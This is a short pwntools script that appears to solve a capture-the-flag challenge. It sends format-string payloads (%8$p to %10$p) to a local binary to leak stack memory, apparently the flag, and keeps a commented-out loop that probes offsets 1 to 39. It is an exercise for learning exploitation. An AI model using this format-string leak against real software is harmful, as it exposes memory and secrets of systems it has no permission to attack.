from pwn import * 
from pwnlib.util.packing import *

context.binary = binary = ELF("./chall")
context.log_level = "error"

p = process()

p.recvuntil(b'> ')

p.sendline(b'%8$p')
out = p.recvline().strip().decode()
out = p64(int(out,16))
p.recvuntil(b'> ')
p.sendline(b'%9$p')
out1 = p.recvline().strip().decode()
out += p64(int(out1,16))
p.recvuntil(b'> ')
p.sendline(b'%10$p')
out1 = p.recvline().strip().decode()
out += p64(int(out1,16))
print(out.decode().split("\n")[0])

# for i in range(1,40):
# 	p = process()
# 	p.recvuntil(b"> ")
# 	tst = f'%{i}$p'
# 	p.sendline(tst.encode())
# 	out = p.recvline().strip().decode()
# 	p.recvuntil(b"> ")

# 	try:
# 		print(i, (p64(int(out,16))))
# 	except:
# 		continue


# 	p.close()

